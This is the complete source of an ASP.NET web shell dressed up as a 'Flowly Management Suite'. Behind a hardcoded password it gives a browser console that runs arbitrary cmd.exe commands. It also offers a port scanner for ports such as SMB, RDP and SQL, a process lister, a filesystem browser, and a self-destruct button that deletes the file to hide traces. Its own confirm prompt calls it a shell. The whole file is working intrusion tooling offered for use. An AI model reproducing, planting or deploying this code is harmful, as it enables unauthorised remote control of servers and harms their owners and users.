<%@ Page Language="C#" ValidateRequest="false" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Collections.Generic" %>

<script runat="server">
    // --- AUTHENTICATION ---
    string pass = "flowly_v6"; 

    protected void Page_Load(object sender, EventArgs e) {
        if (Session["auth"] == null) { LoginPanel.Visible = true; MainPanel.Visible = false; }
        else {
            LoginPanel.Visible = false; MainPanel.Visible = true;
            if (!IsPostBack) {
                lblPath.Text = Request.QueryString["path"] ?? Environment.CurrentDirectory;
                GetSysInfo();
                RefreshGrid();
            }
        }
    }

    private void GetSysInfo() {
        lblOS.Text = Environment.OSVersion.ToString();
        lblUser.Text = Environment.UserName;
        lblIP.Text = Request.ServerVariables["LOCAL_ADDR"] ?? "127.0.0.1";
        lblTime.Text = DateTime.Now.ToString("HH:mm:ss");
    }

    protected void btnLogin_Click(object sender, EventArgs e) {
        if (txtPass.Text == pass) { Session["auth"] = true; Response.Redirect(Request.RawUrl); }
    }

    // --- TERMINAL ---
    protected void btnExecute_Click(object sender, EventArgs e) {
        try {
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + txtCmd.Text) {
                RedirectStandardOutput = true, RedirectStandardError = true, UseShellExecute = false, CreateNoWindow = true
            };
            Process p = Process.Start(psi);
            txtResult.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
        } catch (Exception ex) { txtResult.Text = "Erreur : " + ex.Message; }
    }

    // --- NETWORK SCANNER ---
    protected void btnScan_Click(object sender, EventArgs e) {
        txtScanResult.Text = "Scanning " + txtScanIP.Text + "...\n";
        int[] ports = { 21, 22, 23, 25, 53, 80, 135, 139, 443, 445, 1433, 3306, 3389, 8080 };
        foreach (int port in ports) {
            try {
                using (TcpClient client = new TcpClient()) {
                    var result = client.BeginConnect(txtScanIP.Text, port, null, null);
                    bool success = result.AsyncWaitHandle.WaitOne(100);
                    if (success) txtScanResult.Text += "[+] Port " + port + " : OUVERT\n";
                }
            } catch { }
        }
        txtScanResult.Text += "Scan terminé.";
    }

    // --- PROCESS MANAGER ---
    protected void btnListProc_Click(object sender, EventArgs e) {
        gvProc.DataSource = Process.GetProcesses();
        gvProc.DataBind();
        ProcPanel.Visible = true;
    }

    // --- FILE EXPLORER ---
    private void RefreshGrid() {
        try {
            DirectoryInfo di = new DirectoryInfo(lblPath.Text);
            gvFiles.DataSource = di.GetFileSystemInfos();
            gvFiles.DataBind();
        } catch (Exception ex) { msg.Text = "Accès refusé : " + ex.Message; }
    }

    protected void btnSelfDestruct_Click(object sender, EventArgs e) {
        string path = Request.PhysicalPath;
        Session.Abandon();
        File.Delete(path);
        Response.Write("<h3>Fichier supprimé. Session terminée.</h3>");
        Response.End();
    }

    protected string GetLink(object name, object isDir, object fullPath) {
        if (Convert.ToBoolean(isDir)) return string.Format("<a href='?path={0}' class='dir-link'>[ DIR ] {1}</a>", Server.UrlEncode(fullPath.ToString()), name);
        return "📄 " + name;
    }
</script>

<!DOCTYPE html>
<html>
<head>
    <title>Flowly Management Suite</title>
    <style>
        :root { --bg: #0f0f0f; --panel: #1a1a1a; --accent: #007acc; --text: #e0e0e0; --border: #2d2d2d; --danger: #cc3333; --success: #28a745; }
        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; padding: 20px; font-size: 13px; }
        .container { max-width: 1100px; margin: auto; }
        .panel { background: var(--panel); border: 1px solid var(--border); padding: 15px; border-radius: 4px; margin-bottom: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); }
        h3 { margin-top: 0; color: var(--accent); font-size: 1.1em; text-transform: uppercase; letter-spacing: 1px; }
        .flex { display: flex; gap: 15px; flex-wrap: wrap; }
        .input-text { background: #252526; color: #fff; border: 1px solid var(--border); padding: 6px; border-radius: 3px; }
        .btn { background: var(--accent); color: #fff; border: none; padding: 6px 15px; cursor: pointer; border-radius: 3px; font-weight: bold; }
        .btn-danger { background: var(--danger); }
        .console { background: #000; color: #4ec9b0; font-family: 'Consolas', monospace; width: 100%; height: 200px; border: 1px solid var(--border); padding: 10px; margin-top: 10px; box-sizing: border-box; }
        .dir-link { color: #4ec9b0; font-weight: bold; text-decoration: none; }
        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
        th { text-align: left; background: #2d2d2d; padding: 10px; color: var(--accent); }
        td { padding: 8px 10px; border-bottom: 1px solid var(--border); }
        tr:hover td { background: #252526; }
        .badge { background: #333; padding: 2px 8px; border-radius: 10px; font-size: 0.85em; color: var(--accent); }
    </style>
</head>
<body>
    <form id="form1" runat="server">
        <div class="container">
            <asp:Panel ID="LoginPanel" runat="server" style="text-align:center; margin-top:150px;">
                <div class="panel" style="display:inline-block; width:300px;">
                    <h3>Flowly Auth</h3>
                    <asp:TextBox ID="txtPass" runat="server" TextMode="Password" class="input-text" style="width:90%"></asp:TextBox><br/><br/>
                    <asp:Button ID="btnLogin" runat="server" Text="Connect" OnClick="btnLogin_Click" class="btn" />
                </div>
            </asp:Panel>

            <asp:Panel ID="MainPanel" runat="server">
                <div class="panel flex" style="justify-content: space-between; align-items: center;">
                    <div>
                        OS: <span class="badge"><asp:Label ID="lblOS" runat="server" /></span>
                        User: <span class="badge"><asp:Label ID="lblUser" runat="server" /></span>
                        IP: <span class="badge"><asp:Label ID="lblIP" runat="server" /></span>
                    </div>
                    <div>
                        Server Time: <asp:Label ID="lblTime" runat="server" />
                        <asp:Button ID="btnSelfDestruct" runat="server" Text="Self-Destruct" OnClick="btnSelfDestruct_Click" class="btn btn-danger" style="margin-left:20px;" OnClientClick="return confirm('Supprimer ce shell du serveur ?');" />
                    </div>
                </div>

                <div class="flex">
                    <div class="panel" style="flex: 2; min-width: 400px;">
                        <h3>Terminal Console</h3>
                        <asp:TextBox ID="txtCmd" runat="server" class="input-text" style="width:75%" placeholder="Command..."></asp:TextBox>
                        <asp:Button ID="btnExecute" runat="server" Text="Run" OnClick="btnExecute_Click" class="btn" />
                        <asp:TextBox ID="txtResult" runat="server" TextMode="MultiLine" class="console" ReadOnly="true"></asp:TextBox>
                    </div>

                    <div class="panel" style="flex: 1; min-width: 300px;">
                        <h3>Network Discovery</h3>
                        <asp:TextBox ID="txtScanIP" runat="server" class="input-text" style="width:60%" Text="127.0.0.1"></asp:TextBox>
                        <asp:Button ID="btnScan" runat="server" Text="Scan Ports" OnClick="btnScan_Click" class="btn" />
                        <asp:TextBox ID="txtScanResult" runat="server" TextMode="MultiLine" class="console" style="height:150px; font-size:0.9em;"></asp:TextBox>
                    </div>
                </div>

                <div class="panel">
                    <h3>File System Explorer</h3>
                    <p style="color: #858585;">Current Path: <asp:Label ID="lblPath" runat="server" style="color:var(--accent)" /></p>
                    <asp:Label ID="msg" runat="server" style="color:var(--success)" />
                    
                    <asp:GridView ID="gvFiles" runat="server" AutoGenerateColumns="false" GridLines="None">
                        <Columns>
                            <asp:TemplateField HeaderText="Name">
                                <ItemTemplate><%# GetLink(Eval("Name"), Eval("Attributes").ToString().Contains("Directory"), Eval("FullName")) %></ItemTemplate>
                            </asp:TemplateField>
                            <asp:BoundField DataField="LastWriteTime" HeaderText="Modified" ItemStyle-Width="180px" />
                            <asp:TemplateField HeaderText="Size">
                                <ItemTemplate><%# Eval("Attributes").ToString().Contains("Directory") ? "--" : (Convert.ToInt64(Eval("Length"))/1024).ToString() + " KB" %></ItemTemplate>
                            </asp:TemplateField>
                        </Columns>
                    </asp:GridView>
                </div>

                <div class="panel">
                    <h3>System Processes</h3>
                    <asp:Button ID="btnListProc" runat="server" Text="List Running Processes" OnClick="btnListProc_Click" class="btn" />
                    <asp:Panel ID="ProcPanel" runat="server" Visible="false">
                        <asp:GridView ID="gvProc" runat="server" AutoGenerateColumns="false" GridLines="None">
                            <Columns>
                                <asp:BoundField DataField="Id" HeaderText="PID" />
                                <asp:BoundField DataField="ProcessName" HeaderText="Name" />
                                <asp:BoundField DataField="BasePriority" HeaderText="Priority" />
                                <asp:BoundField DataField="WorkingSet64" HeaderText="Memory (Bytes)" />
                            </Columns>
                        </asp:GridView>
                    </asp:Panel>
                </div>
            </asp:Panel>
        </div>
    </form>
</body>
</html>